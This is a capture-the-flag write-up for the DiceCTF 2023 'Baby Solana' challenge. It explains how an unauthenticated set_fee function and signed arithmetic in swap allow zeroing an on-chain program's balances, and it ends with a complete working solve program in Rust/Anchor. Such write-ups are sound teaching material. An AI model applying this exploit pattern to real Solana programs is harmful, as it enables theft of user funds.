---
title: "Dice 23 Baby Solana"
date: 2023-02-19 18:05:30 -0400
categories: Pwn
---
# Baby Solana

## Remark
So this was my first Solana pwn/challenge.
It was a great learning experience seeing Rust at work interacting with Solana.
It seems to have an interesting syntax!

## Source Code
Extracting the given folder provides two folders: framework and framework-solve

I was mostly interested main.rs and lib.rs within the framework folder.

Observe the code in main.rs:
```
        let ix = chall::instruction::InitVirtualBalance {
            x: 1_000_000,
            y: 1_000_001,
        };
```
I'm not 100% sure about the Rust syntax, but it seems like initializing instance variables in a class of a trivial Object Oriented language; in this case x and y to 1,000,000 and 1,000,001 respectively.

and
```
        if state.x == 0 && state.y == 0 {
            writeln!(socket, "congrats!")?;
            if let Ok(flag) = env::var("FLAG") {
                writeln!(socket, "flag: {:?}", flag)?;
            } else {
                writeln!(socket, "flag not found, please contact admin")?;
            }
        }
```
This will print the flag if x and y are both set to zero. This will be our aim.

In lib.rs, we can find two methods set_fee and swap that interact with fee, x, and y. These will allow us to control x and y and eventually print the flag:
```
    pub fn set_fee(ctx: Context<AuthFee>, fee: NUMBER) -> Result<()> {
        let state = &mut ctx.accounts.state.load_mut()?;

        state.fee = fee;

        Ok(())
    }
    
    pub fn swap(ctx: Context<Swap>, amt: NUMBER) -> Result<()> {
        let state = &mut ctx.accounts.state.load_mut()?;

        state.x += amt;
        state.y += amt;

        state.x += state.fee * state.x / 100;
        state.y += state.fee * state.y / 100;

        Ok(())
    }
```

## Attack Plan
We need to utilize these methods to manipulate the fee, x, and y.

We are given this code in lib.rs inside framework-solve folder:
```
pub fn get_flag(_ctx: Context<GetFlag>) -> Result<()> {
        Ok(())
    }
```

I assume that I need to complete this method get_flag to "get flag."

By studying the method swap, I concluded that if I can pass a value of -1,000,000 to amt and set fee as -100, I can set x and y as 0.

We pretty much have to set the fee first in order to call swap for another account and make x and y zero.

If we take a look at lib.rs again:
```
    pub fn set_fee(ctx: Context<AuthFee>, fee: NUMBER) -> Result<()> {
        let state = &mut ctx.accounts.state.load_mut()?;

        state.fee = fee;

        Ok(())
    }
    
    pub fn swap(ctx: Context<Swap>, amt: NUMBER) -> Result<()> {
        let state = &mut ctx.accounts.state.load_mut()?;

        state.x += amt;
        state.y += amt;

        state.x += state.fee * state.x / 100;
        state.y += state.fee * state.y / 100;

        Ok(())
    }
```
We see that the context needs to be AuthFee to call set_fee and Swap to call swap.
So I'll initialize two accounts, each being AuthFee and Swap type so that I could set the fee using AuthFee account and set x and y using Swap account.

## Exploiting
Within the framework-solve folder, I will edit lib.rs's getflag() method to call set_fee() and swap().

To call set_fee(), I need to create a AuthFee account, which can be set as:
```
let fee_accs = chall::cpi::accounts::AuthFee{
            state: _ctx.accounts.state.to_account_info(),
            payer: _ctx.accounts.payer.to_account_info(),
            system_program: _ctx.accounts.system_program.to_account_info(),
            rent: _ctx.accounts.rent.to_account_info(),
        };
```

Then, we can create an instance of fee_accs to be used to call set_fee like:
```
let fee = CpiContext::new(_ctx.accounts.chall.to_account_info(), fee_accs);
```

and we call set_fee as:
```
chall::cpi::set_fee(fee, -100)?;
```

Similarily, we set account type Swap, create an instance, and call swap as follows:
```
let swap_accs = chall::cpi::accounts::Swap{
            state: _ctx.accounts.state.to_account_info(),
            payer: _ctx.accounts.payer.to_account_info(),
            system_program: _ctx.accounts.system_program.to_account_info(),
            rent: _ctx.accounts.rent.to_account_info(),
        };

let swap_cpi = CpiContext::new(_ctx.accounts.chall.to_account_info(), swap_accs);
chall::cpi::swap(swap_cpi, -1_000_000)?;
```

Finally, running the provided ```./run.sh ``` gives us the flag.

## End
The final lib.rs looks like:
```
use anchor_lang::prelude::*;

use anchor_spl::token::Token;

declare_id!("osecio1111111111111111111111111111111111111");

#[program]
pub mod solve {
    use super::*;

    pub fn get_flag(_ctx: Context<GetFlag>) -> Result<()> {
        let fee_accs = chall::cpi::accounts::AuthFee{
            state: _ctx.accounts.state.to_account_info(),
            payer: _ctx.accounts.payer.to_account_info(),
            system_program: _ctx.accounts.system_program.to_account_info(),
            rent: _ctx.accounts.rent.to_account_info(),
        };

        let fee = CpiContext::new(_ctx.accounts.chall.to_account_info(), fee_accs);
        chall::cpi::set_fee(fee, -100)?;

        let swap_accs = chall::cpi::accounts::Swap{
            state: _ctx.accounts.state.to_account_info(),
            payer: _ctx.accounts.payer.to_account_info(),
            system_program: _ctx.accounts.system_program.to_account_info(),
            rent: _ctx.accounts.rent.to_account_info(),
        };

        let swap_cpi = CpiContext::new(_ctx.accounts.chall.to_account_info(), swap_accs);
        chall::cpi::swap(swap_cpi, -1_000_000)?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct GetFlag<'info> {
    #[account(mut)]
    pub state: AccountInfo<'info>,
    #[account(mut)]
    pub payer: Signer<'info>,

    pub system_program: Program<'info, System>,
    pub token_program: Program<'info, Token>,
    pub rent: Sysvar<'info, Rent>,
    pub chall: Program<'info, chall::program::Chall>
}
```
Thanks, 079.
